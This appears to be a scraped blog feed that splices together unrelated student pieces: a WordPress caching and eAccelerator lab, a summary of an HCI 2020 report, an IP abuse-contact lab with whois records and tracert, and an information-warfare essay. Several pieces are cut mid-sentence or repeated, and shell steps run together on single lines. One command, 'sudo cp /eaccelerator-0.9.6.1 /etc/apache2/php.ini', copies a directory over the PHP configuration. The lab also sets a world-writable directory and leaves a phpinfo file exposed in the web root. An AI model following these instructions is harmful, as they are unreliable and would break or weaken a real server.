problems and solutions for the future, possibilities of internet (social
networks, VOIP, IM etc.), net generations1, thus today it is the main
source of grouping the population for massive protests or any other
actions, which can end-up to a war or scandal.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Consequently the technology and science are rising, the possibilities
and the changes in an aspect of wars will change. For instant is Russian
– Georgian conflict in 2008 as a result of territorial attack and in
sequence with it there was an cyber-attack in progress2; or powerful
internet worm repeatedly targeted five nuclear industrial facilities in
Iran and many others3. Therefore, nowadays this actions and concept of
warfare is different, no more uniforms, battles etc. Warfare’s are
getting new aspect and new ways to approach through the technology.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to evaluate speed-up solution for

&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to evaluate speed-up solution for
already mounted clean, by default wordpress CMS platform. The measures
were made by custom script for Linux operating system, in our case the
server side is Ubuntu server 10.04 LTS running on 32 bit system with
512MB Ram and testing platform Fedora 14 for more details see section
appendixes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The laboratory task is to assist anyone else to be able to perform
optimization in easy meaner to their blog, homepage, magazine, etc.
without any advantage of technical knowledge.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Presenting stepwise solution with installing firstly wordpress
optimization cache plugin, secondary installing PHP solution for
increasing the acceleration performance of the server and changing the
permalinks settings to the CMS platform for higher optimization. All of
the above solutions are free open source, and are taking care of the low
budget.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In addition providing measurement results with different scenarios will
help us to get wide picture of how affective was optimization.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;METHODS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Optimization of the access to wordpress CMS platform is done in behalf
of three different scenarios have been proved while performance is
getting slightly higher. Test script is measuring the response time of
the link provided and it is recording the results in a text file. Which
contains the three attends respondent time of the server. For each
method we will provide the results in analyses section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The following steps should be done on the server side.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Installing procedure [WP-Super-Cache Installation], first method of
wordpress plugin: WP Super Cache Version 0.9.9.9&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    In a terminal please type the following lines:wget -c http://downloads.wordpress.org/plugin/wp-super-cache.0.9.9.9.zipsudo apt-get install unzipunzip wp-super-cache.0.9.9.9.zipmv /home/[user]/wp-super-cache /var/www/wordpress/plugins

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;In wordpress administration link:
&lt;a href="http://192.168.56.102/wordpress/wp-admin"&gt;http://192.168.56.102/wordpress/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href="http://192.168.56.102/wordpress/wp-admin"&gt;wp-admin&lt;/a&gt;, log in with the
credentials, from the panel select &lt;em&gt;Plugins&lt;/em&gt; -&gt; &lt;em&gt;WP-Super-Cache&lt;/em&gt; -&gt;
&lt;em&gt;Activate&lt;/em&gt;. After the activation is done, go to &lt;em&gt;Settings&lt;/em&gt; -&gt;
&lt;em&gt;WP-Super-Cache&lt;/em&gt;, on the first tab activate the cache by selecting the
On cache and on the Advance tab select only the “(Recommended)”
settings. After your done, select &lt;em&gt;Update Settings&lt;/em&gt; and on the bottom of
the page you can see a red text that needs to be copy in one of the
files that is located on the server. Connect to your server by FTP
client and locate the &lt;em&gt;.htaccess&lt;/em&gt; file on the wordpress directory and
open it and paste the following lines and save the file:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    # BEGIN WPSuperCache &amp;lt;IfModule mod_rewrite.c&amp;gt;RewriteEngine On RewriteBase /wordpress/AddDefaultCharset UTF-8RewriteCond %{REQUEST_URI} !^.*[^/]$RewriteCond %{REQUEST_URI} !^.*//.*$ RewriteCond %{REQUEST_METHOD} !POST RewriteCond %{QUERY_STRING} !.*=.*RewriteCond %{HTTP:Cookie} !^.*(comment_author_|wordpress_logged_in|wp-postpass_).*$RewriteCond %{HTTP:X-Wap-Profile} !^[a-z0-9\"]+ [NC]RewriteCond %{HTTP:Profile} !^[a-z0-9\"]+ [NC]RewriteCond %{HTTP_USER_AGENT} !^.*(2.0\ MMP|240x320|400X240|AvantGo|BlackBerry|Blazer| Cellphone|Danger|DoCoMo|Elaine/3.0|Eu$ RewriteCond %{HTTP_user_agent} !^(w3c\ |w3c-|acs-|alav|alca|amoi|audi|avan|benq|bird| blac|blaz|brew|cell|cldc|cmd-|dang|doco$ RewriteCond %{HTTP:Accept-Encoding} gzip RewriteCond %{DOCUMENT_ROOT}/wordpress/wp-content/cache/supercache/% {HTTP_HOST}/wordpress/$1/index.html.gz -f RewriteRule ^(.*)"/wordpress/wp-content/cache/supercache/%{HTTP_HOST}/wordpress/ $1/index.html.gz" [L] RewriteCond %{REQUEST_URI} !^.*[^/]$RewriteCond %{REQUEST_URI} !^.*//.*$ RewriteCond %{REQUEST_METHOD} !POST RewriteCond %{QUERY_STRING} !.*=.*RewriteCond %{HTTP:Cookie} !^.*(comment_author_|wordpress_logged_in|wp-postpass_).*$RewriteCond %{HTTP:X-Wap-Profile} !^[a-z0-9\"]+ [NC]RewriteCond %{HTTP:Profile} !^[a-z0-9\"]+ [NC]RewriteCond %{HTTP_USER_AGENT} !^.*(2.0\ MMP|240x320|400X240|AvantGo|BlackBerry|Blazer| Cellphone|Danger|DoCoMo|Elaine/3.0|Eu$ RewriteCond %{HTTP_user_agent} !^(w3c\ |w3c-|acs-|alav|alca|amoi|audi|avan|benq|bird| blac|blaz|brew|cell|cldc|cmd-|dang|doco$ RewriteCond %{DOCUMENT_ROOT}/wordpress/wp-content/cache/supercache/% {HTTP_HOST}/wordpress/$1/index.html -f RewriteRule ^(.*) "/wordpress/wp-content/cache/supercache/%{HTTP_HOST}/wordpress/ $1/index.html" [L] &amp;lt;/IfModule&amp;gt;# END WPSuperCache

&lt;/div&gt;

&lt;/p&gt;

&lt;h2&gt;METHOD 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;The second approach is to install an PHP accelerator and optimizer
[EAccelerator Installing from source]. The main goal is to increases the
performance of PHP scripts by caching them in their compiled state.
Which will augment the acceleration applied with method 1.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, please follow the steps to install from source code
eAccelerator [2].&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo apt-get install php-devwget -c http://ignum.dl.sourceforge.net/project/eaccelerator/eaccelerator/eAccelerator%200.9.6.1/eaccelerator-0.9.6.1.tar.bz2tar xvfj eaccelerator-0.9.6.1.tar.bz2cd eaccelerator-0.9.6.1phpize./configuremakesudo make installsudo cp /eaccelerator-0.9.6.1 /etc/apache2/php.inisudo mkdir /tmp/eacceleratorsudo chmod 0777 /tmp/eacceleratorsudo /etc/init.d/apache2 restart

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;After you have completed the above steps it is good way to test the php
if the eaccelerator is working and correctly installed. In any case,
please create a file called &lt;em&gt;info.php&lt;/em&gt; on your wordpress directory with
the following code inside:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    &lt;?php phpinfo(); &gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Access the link to your server vie the link
http://192.168.56.102/wordpress/info.php. If you see the configuration
information and details of PHP, the quickest way is to search for
eaccelerator, and if the result is positive, most lightly you have
installed eaccelerator correctly.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;After we have completed the first and second methods it is time to grow
the interactiveness of our wordpress project. Therefore, we will change
setting to wordpress configuration where will speed-up the performance
[Using Permalinks]. If can still add more optimization and acceleration
applications, yet this laboratory report is performed only with three
easy and maintained steps.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Please log in to the wordpress administration panel, and on &lt;em&gt;Settings&lt;/em&gt;
-&gt; &lt;em&gt;Permalinks&lt;/em&gt; select &lt;em&gt;Default&lt;/em&gt;. After the step is done, then we need
to edit the &lt;em&gt;.htaccess&lt;/em&gt; file and add the following lines at the end of
the file and please save it:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    # BEGIN WordPressIfModule mod_rewrite.c&amp;gt;RewriteRule ^index\.php$ - [L]RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule . /wordpress/index.php [L]&amp;lt;/IfModule&amp;gt;# END WordPress&lt;/pre&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;h1&gt;ANALYSIS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After completing each one of the method we should perform analysis of
the system, were it will provide results of performance speed and can
compare it if it is utter to improve the effectiveness of wordpress.
Please refer to the appendix 3 to get the code of the script.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Meanwhile the below show the results served pages per/second with three
sets from the automatically created file from the custom script, named
&lt;em&gt;results_lab2.txt&lt;/em&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;/table&gt;

&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;From the analysis above we can see that performance has increased and
wordpress project is more affectively respondent to our needs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustrations shows that wordpress as a default setting, clean installed
and configure response with 3.15, 3.70 and 3.84 pages/per-second, which
is not good enough to satisfaction. Similar to, after installation and
configuration of wordpress plugin WP-Super-Cache we that notice that the
performance slightly has grown but still the performance doesn’t
satisfied higher. However after implying the second method, installing
eaccelerator the results drastically increased. From the above
illustration we can see that the different methods produce different set
results. Thus increasing changes performing different methods vs sets of
pages/per-second are specified in the illustration 1.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the results were expected and demonstrating example how we can
increase the addictiveness of wordpress performance and increase the
respondent time pages view per/second.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;However, if we need to get higher effectiveness and response time for
wordpress than should consider apply nginx[3] server and third party
projects, applications to increase the optimization of wordpress. For
instance good tutorial is on following blog [Howto hginx+php].&lt;/p&gt;
&lt;/p&gt;

the El Bulli Hacienda Hotel near Seville, Spain. The event’s title
expressed its key question: what will Human-Computer Interaction (HCI)
be like in the year 2020? (Harper, Tom, Yvonne, &amp;amp; Abigail, 2008, p. 8)
The report that I have read it is divided in a four parts; Part 1 it is
look back over the past 20 years or so; Part 2 it gives an outline how
does changes are transforming the nature of our interaction with
computers and the key questions that need to be addressed in the next 15
years as a result; Part 3 is concerned with HCI as a field of research
and as a community of practitioners and designers; Part 4,
recommendations, outlines specific suggestions for HCI in terms of how
the field needs to be change. Therefore, the research report it talks
about the future aspects and the future plans with an recommendations
that has to be concern in an aspect of HCI, I have chosen to write about
the part 4 where they give a good outline of the recommendations that
has to be encounter for the new actions in the future of HCI.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The research report came with very good seventh future directions. Each
direction will be described in an educationally signification for me,
what I have learned and what should be the next future actions in
consideration. Matter of course, no one will know in what kind of
aspects and future plans the HCI will change, but still this research
report gives vaulting and most important future recommendations that
need to be considered, and there will be more and more recommendations
and future directions as the technology and the HCI changes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Before we start to talk about the recommendations in a field of HCI,
let’s see what HCI is. It is a term used to refer to the understanding
and designing of different relationships between people and computers.
In the late 1970’s the main concern was usability. Since then, HCI has
established and designed, developed and apply all manners to ensure that
the technologies are easy to learn and easy to use. (Harper, Tom,
Yvonne, &amp;amp; Abigail, 2008, p. 84)&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After getting familiar with the terms and the practice of HCI let as
look though the main seventh future recommendations that were considered
by the scholars and people involved in this forum.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Recommendation 1: Revisit research and design methods in HCI: it is
    a distinct research area, methods and techniques have been used have
    altered over the years. Computer system and technologies are still
    in a way of changes, thus are the approaches for 2020 that needs to
    be considered:&lt;/li&gt;
&lt;li&gt;Explore new ways of understanding users. Over the last decade there
    have been techniques and design-based practices involving cultural
    probes. Usage of existing techniques of understanding that have
    emerged from scientific and engineering traditions, designs, views
    of diverse disciplines and cultural traditions; usage of conceptual
    analysis in the first stage of new HCI, where can comes from
    techniques of analytic philosophy and clarifying the systems of
    meaning and value of actions that are involved.&lt;/li&gt;
&lt;li&gt;Explore new ways of designing and making. Designing and making it
    takes a very important influence in a way of HCI. It is very
    important to comprehend for what, which and why the system is going
    to be used, what kind of users. In the future lightweight and
    prototypes should fit the designing and engineering solutions
    together. Should be developed new technological, prototype tool for
    the future development, and consider a test of hardware and software
    within every day.&lt;/li&gt;
&lt;li&gt;Reconsider how to evaluate digital technologies. Create a purpose of
    usage of the system, towards the, is it going to be used in everyday
    life in houses, working spaces or other environment. For what kind
    of usability the system is going to be used. For all should be made
    evaluation tools to reconsider the criteria and techniques.&lt;/li&gt;
&lt;li&gt;Recommendation 2: Be explicit about the remit of HCI. How far or
    whether the HCI as a research area should continue extend itself, or
    should be involved with interaction between people and digital
    technology, and should with concern itself more than in the past?
    Does are the question that should be raised. It should develop new
    design possibilities, future altering and crafting the landscape.&lt;/li&gt;
&lt;li&gt;Recommendation 3: Develop disciplinary techniques that allow HCI to
    collaborate with other research communities&lt;/li&gt;
&lt;li&gt;Disciplinary exchange. Requirement for HCI researchers to know how
    to converse with disciplines with very different traditions, they
    need to understand what philosophers can do and why philosophy is
    important. Example: economists.&lt;/li&gt;
&lt;li&gt;Beyond interdisciplinary boundaries. HCI should ask what might be
    the appropriate models for allowing interdisciplinary investigations
    to happen and it is an area where investment in research theories
    and approaches, in the elements of HCI competence and skill, and in
    the foundations of the philosophy of science are required.&lt;/li&gt;
&lt;li&gt;Recommendation 4: Teach HCI to the young. Children should be
    introduced to the ‘properties and possibilities of computing’ it is
    the only way that they develop sufficient understanding of computing
    to enable them to be fully computer-literate when they are adults,
    and help them to shape the world in relation to technology.&lt;/li&gt;
&lt;li&gt;Recommendation 5: More advanced training for future HCI researchers.
    HCI professionals need to move outside of the scientific community
    they have lived within and find ways to engage with society as a
    whole.&lt;/li&gt;
&lt;li&gt;Recommendation 6: Engage with government, policy and society. More
    better technical and economical approach, where there will be wide
    range of implementing HCI in a government, but in policy and
    society. HCI should have a strong links with the society, it needs
    to interact more, not only like for policy in a trust and security
    in computer systems.&lt;/li&gt;
&lt;li&gt;Recommendation 7: Offer an inclusive future in 2020. By 2020, HCI
    will need to be able to design for and support differences in human
    value, irrespective of the economic means of those seeking those
    values. In this way, the future can be different and diverse because
    people want it to be. (Harper, Tom, Yvonne, &amp;amp; Abigail, 2008, pp.
    78-83)&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;I found this article very interesting, not only in an aspect of human
interaction with computers but with the actions that were taken and the
propositions that were sum. I love to make a summer of the entire
research paper, but because of the short time period I could not make
it. Still I gained my knowledge what should be expected and where are
burrows in HCI field. It gives me a perfect view for the future
implementation of projects, aspects and techniques that can be used.
Hope that this few years since the 2007, the implementation and
recommendation directories have been successfully.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the responsibilities
for the IP addresses below and how we can make connection to them. IP
addresses are randomly chosen by the lecture.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;IP addresses:&lt;/p&gt;
&lt;p&gt;​1. 69.163.171.238&lt;/p&gt;
&lt;p&gt;​2. 31.44.184.101&lt;/p&gt;
&lt;p&gt;​3. 188.72.228.69 …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the responsibilities
for the IP addresses below and how we can make connection to them. IP
addresses are randomly chosen by the lecture.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;IP addresses:&lt;/p&gt;
&lt;p&gt;​1. 69.163.171.238&lt;/p&gt;
&lt;p&gt;​2. 31.44.184.101&lt;/p&gt;
&lt;p&gt;​3. 188.72.228.69&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;External IP that is used for purpose of this test is following:
193.40.244.0/255 1. The ISP that provides this network is EENet2.
Organization that is behind is Tallinn Technical University, Estonia.
City location is Tallinn and the region is Harjumaa. The phone number of
my ISP is: +372 73&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;. The e-mail we should report abuse are: first
persons that is in charge: Viktor Borisevitch (e-mail:&lt;/strong&gt;tor at cc.ttu.ee
and phone number: +372-2-&lt;strong&gt;&lt;em&gt;*46) and Andres Lepp (e-mail: l&lt;/em&gt;&lt;/strong&gt; at
cc.ttu.ee and phone number: +372 6 &lt;strong&gt;*&lt;/strong&gt;55). In addition, if we wont to
submit an abuse we should use both persons of network administration and
then we can submit and security incident on the following ISP e-mail:
turvas@eeenet.ee [RIPE NCC].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;All in all, Method 1 and Appendix 1 describes the website, tools and
application that are used to conduct this laboratory report. In
addition, Method 2 and Appendix 2 will introduce website tools and
databases where we can check if following IP’s have been reported before
as abuse and security risk. Both methods are represented with answer and
consequences confront in the result section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of all collected data will be concise in
conclusion section of this report.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;METHODS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;First method describes and demonstrates web tools that have been used to
collect the needed information from the stated IP’s addresses. Second
method is pointing out website tools and databases that can be applied
if the IP has been reported previously as a abuse, spam or security
threat.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, we need to collect as much as we can details about the IP
address. In Appendix 1 is showing the wholly information of the IP’s,
contact details, organization name, address, location, state, country,
technicians contact, abuse phone number, abuse e-mail, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Depending on the location of IP we should make sure that not only we
know the ISP or abuse contact details, but we should know national CERT
3 agency that is in charge too. Therefore, to collect the information we
have used different web sites, agencies: [RIPENCC, LACNIC, AfriNIC,
APNIC, ARIN]. The above reference are agencies collected from IANA4.
Authority responsible for global coordination of the Internet Protocol
addressing systems [IANA].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, to have more details about the route of the IP’s we are using
command prompt in Windows 7 with the following command, where the
results are presented in Appendix 2 section:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    tracert [0.0.0.0]To illustrate, the details information are presented in Result 1 section.

&lt;/div&gt;

&lt;/p&gt;

&lt;h2&gt;METHOD 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;After we have collected the wholly information about the concrete IP
proposals, we should check if in addition those IP’s previously have
been reported as abused, spam or security threat. To complete the
following method we need to check concrete database system that is
offering following service. First that crossed on web is [MalwareURL]
which is dedicated to fighting malware, trojans and a multitude of other
web-related threats. In addition, we can check if the IP addresses are
listed in anti-spam databases. With other words blacklist check
[MyIPAddress].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Results from Method 1 are presented in Result 1, further Method 2 is
presented in Result 2.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULT 1&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;For each IP are presented only the most important data details that we
need to collect for our goal. In addition, full description and details
are presented in Appendix 1. The tables bellow are illustrating the most
important information that we should look-for. In addition, the
highlighted lines are indicating the abuse e-mail box that should be
send mail too.&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    69.163.171.238OrgName: New Dream Network, LLCAddress: 417 Associated Rd.Address: PMB #257City: BreaStateProv: CAPostalCode: 92821Country: US#technician in chargeOrgTechName: Nagel, MarkOrgTechPhone: +1-714-706-4182OrgTechEmail: mna47-arin at dreamhost.com#abuse in chargeOrgAbuseName: DreamHost Abuse TeamOrgAbusePhone: +1-714-706-4182OrgAbuseEmail: abuse&amp;nbsp; at dreamhost.comTable 131.44.184.101person: Chris Burnsaddress: Building 4&gt;address: City West Office Parkaddress: Gelderd Roadaddress: Leeds LS12 6LXaddress: Englandphone: +44-208-901-2332#abuse e-mail: abuse-mailbox: abuse at laveconetworks.co.ukTable 288.72.228.69role: Mannesmann Arcor Network Operation Centeraddress: Arcor AG &amp;amp; Co.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;However, now that we know the abuse e-mail, phone number and contact
person details, still is this information enough for us. If we look in
details all of the IP’s are from different countries. Therefore we need
to find what is the national CERT agency contact details. First table is
based in USA, therefore we need to use their reporting system, which is
locate in the following link: &lt;a href="http://www.us-cert.gov/"&gt;http://www.us-cert.gov/&lt;/a&gt; . Second table
is UK, the national CERT agency link:
&lt;a href="http://www.ukcert.org.uk/"&gt;www.ukcert.org.uk&lt;/a&gt;. Third table is based in
Germany, the CERT agency link: &lt;a href="http://www.cert-verbund.de/"&gt;http://www.cert-verbund.de/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the routing trace we can conclude that the first IP and the third
respond and it did not miss route trace, where in the second IP,
31.44.184.101 there is miss route trace.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;That is why we will run this IP address to Method 2. Despite the fact,
still we will run the rest of IP’s in the Method 2, to be trusted that
are not in the abuse list.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;RESULT 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Next step is to attempt to search the IP address to check if they have
been previously report as a abuse, trojan, malware, security threat,
etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To check and verify the security status we are using the service
available [MalwareURL]. Where results for 69.163.171.238 and
88.72.228.69 are with status that have not been previously reported as
abuse. On the other hand, 31.44.184.101 IP address is detected as an
security threat before. More details are presented in Appendix 3. Where
is demonstrating that the
&lt;code&gt;/404.php?type=stats&amp;amp;amp;affid=531&amp;amp;amp;subid=03&amp;amp;amp;iruns&lt;/code&gt; has been
reported as malicious URL and it is in a blacklist of Google, MyWOT,
etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Not only that it is listed in the malware database list, but also if we
double check on service [MyIPAddress] that the 31.44.184.101 IP address
is listed in few blacklist which is assess by DNSBL5.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, I would like to reiterate that the concrete IP’s that we
analysis in this report are demonstrating the process and methods that
should be done in future to detect, report abuse, malware, threat,

&lt;/p&gt;

&lt;p&gt;The rapid development of information technology (IT) over the past three
decades has led to many changes for example in military and defense
circles, social society, and economy in the information age. Nowadays
many scholars are in a process of developing theories and concept of
affective influence of victory in conflicts in the information age. In
this essay the main discussions are about the interchanges of victory in
conflict in the information age in aspect of divers’ view of anatomy of
information warfare; different views and approaches to information
warfare/operation in a couple of countries, which will end with
conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Today, much of the enthusiasm for the information-led revolution in
military affairs (RMA) or military transformation (as the newly
preferred term of art), specifically in Gulf War model of decisive
action appeared to demonstrate how total victory could be achieved
reliably in the future (Gray, April 2002, p. 30). RMA’s are immoderate,
abrupt prose changes in paths of warfare waged and they are brought by
development of technology and social changes. Therefore, in the end of
Cold War development has formed the basis of RMA, where the present is
usually defined as a transition to network-based/network-centric warfare
(NCW), for instance: stealth technology, precision-guided munitions
(PGM), computer technologies (Internet), etc. In addition the examples
of implementing RMA are Afghanistan (2001) and Iraq (2003) war, where
they started as traditional conflicts and transformed into insurgencies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;According to Carl von Clausewitz’s book On War, “War is an act of
violence whose object is to compel the enemy to do our will”. Yet, 2000
years earlier Sun Tzu, established a benchmark for a mastery of war “To
subdue the enemy without fighting is the acme of skill.” Underlying
those statements is an appreciation of the psychology of war. Indeed, by
combining the statements Commander Randall G. Bowdish made a dissent
statement of information age psychological operations “to compel the
enemy to do our will without fighting. (Bowdish, December1998 – February
1999)”. Another view made by other commander remark “In war there can be
no substitute for victory.” General Douglas MacArthur, 1951 (Gray, April
2002).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, the history of 20th century sufficesto remind us that
there are many ways to win a war, but still various ways are not
equivalent, and final victory does not necessarily belong to the side
that dictates the conditions of peace. Which lends to viewpoint of how
should we determine whether the victory is at hand, and define the time
end of major battlefield to see if the post-war payoffs have been
archived. Yet, there are moral considerations, archiving peace, e.g.
humanitarian intervention, fair treatment may accelerate cessation of
hostilities and surrender and law of armed conflict sets strict rules of
behaviours by using weapon systems, treatment of prisoners, etc.  &lt;/p&gt;
&lt;p&gt;Therefore, in the past, before World War I, there are fewer clear
victories, of 311 wars from 1480 to 1970; only 137 wars were concluded
with a peace treaty. Specifically, after World War II, almost 50% of the
wars have been followed by a renewed fighting after initial cessation of
hostilities. But, since the end of Cold War acceptability of armed force
have continued and even escalated, particularly in open political
systems. Such as, globalization is a strong impediment waging a total
war. Therefore, today in the era of democracy, wars are hard to start,
but even harder to bring to an end.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays, the modern wars/information warfare consists on different
vector of victory. Today is unacceptable to have extreme violence, such
as losing small wars. Thus, victory today has changed drastically and
vector consists of six aspects: informational(e.g. intelligence in
internal and external sources, protection of information system with
manipulation or disruption of its enemy), military (e.g. military
security, action itself, enemy’s attack against the action and defense
for the action against enemy’s attack), political (e.g. political
stability, national interests, etc.) , economical (e.g. rebuilding of
economical infrastructure, integration into the regional and global
economy, trading of shares), social (e.g. ethnic, religious,
nationalistic, social society violence to resolve in internal and
external conflicts) and diplomatic (e.g. involving reliable approval and
tangible support for the war outcome from the victory domestic public,
foreign allies, international organizations and other observers)
(Ahvenainen, January 2000).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As a consequence these changes mean decreased importance of nation
states, increased importance of virtual reality, network organizations
and dominance of economy, information, technical intelligence and other
information and network based organizations (Ahvenainen, January 2000).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Another change in information age is terrorism. Information age
terrorism may take on three distinct forms: conventional terrorism,
technoterrorism, and cyberterrorism. The purpose weapons of the
cyberterrorist are not designed to kill people or break physical
objects. Rather, they exist exclusively to destroy or modify computer
data. The weapons and the targets are the electrons moving within
cyberspace. While it is possible to attack this data without any human
interfaces, the human is usually the weakest link in a computer system
(Littleton, December 1996).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To illustrate historically, there have been observed four waves of
modern terrorism:1880-1920: anarchist terrorism (began in Russia),
1920-1960: terrorism in support of national liberation (IRA, Irgun,
PLO), 1960-1980: neo-leftist terrorism (Action Directe, BrigateRosso,
Rote ArmeeFraktion) and 1980-present: religious terrorism (Hamas,
al-Qaeda, Islamic Jihad) (Cronin &amp;amp; James , 2004).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the other hand of information terrorism there is modern insurgency,
likelihood counterinsurgency. Modern insurgency is supported by a wide
variety of non-state actors from abroad and it consists of many
foreign/local society fighters in addition to local population. They
still need support of the local population, but as it does not aspire
for straight military victory. Nowadays insurgency, could be weaker than
previous generations (hence the use of terrorism) as there are no
powerful states directly behind it and they disseminate information
about its activities all over the world, which does not rely only on
official mass-media, it also uses of effectively Internet (Hammes &amp;amp; T.,
July-August 2006).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Analogous to, strategic asymmetry in modern counterinsurgency (CI) and
modern insurgency (I) are respectful goals. Like, (CI) victory means
building up a stable state less than (I) getting rid of victorious
state/coalition. As to win, (CI) needs “hearts and minds” of the
majority of population, rather than (I) needs support of sufficient part
of population. For instance, (CI) must deal successfully with tactical
military activities to provide security, where (I) need to be successful
only to a certain extent – inflicted casualties attack the will of
(CI’s) strategic leadership. More (CI) must win, less (I) must
persuade(CI) that winning is impossible. Due to winning state building
takes time, whereas persuading could happen fast.  &lt;/p&gt;
&lt;p&gt;Therefore, evolution of insurgency in the information age is into
persuasion/communication campaign which naturally increased resort to
terrorism and relying on external support of non-state actors. Opposite
to strategic victory of counterinsurgent arises from series of tactical
victories and a state build-up, whereas only one tactical victory of
insurgent might in the worst case lead to a strategic victory –
withdrawal of the coalition.  &lt;/p&gt;
&lt;p&gt;Nowadays, we can see seven different species of information warfare:
command and control warfare, C2W (or C4I – command, control,
communications, computers, and intelligence (Joint Publication 1-02, 8
November 2010)); intelligence-based warfare, IBW; electronic warfare,
EW; psychological warfare, PSYOP; hacker warfare, HW; economical
information warfare, ECOIW and netwar / cyberwar (Lubicki, 3 August
1995). Therefore, different types of IW, first add the power of
conventional warfare, which create new means of victory and defeat.
Next, more important are possibilities to change the entity of warfare
in a way that tanks, airplanes and HF -radios changed the warfare
between the world wars. Today the best aspect of IW is the American
doctrine in military adaptation and Information Operations (IO)
(Ahvenainen, January 2000), which is going to be discussed in the
following lines, comparing with view aspects of IW in China.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Different countries, different approaches in process of implementation
of IW, US, China and Russia, are intense examples. First US views in IO
are to complementing traditional military means and allowing influencing
enemy decision-making. More or less, Chinese views in IW are tool to
compensate for their military inferiority and accelerate their economic
development, which could enable the country to expert control over many
developments in the world. Then US has series of offensive IO’s, but has
been in trouble in accommodating to modern information society where the
enemy can attack directly the will of state national leadership.
Opposite, Chinese military in IW are focused on the person of enemy
commander and strives to alter his decisions and perceptions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Consequently, US strength in the IO fields is in its technical
capabilities and weakness in seeking excessive control and understanding
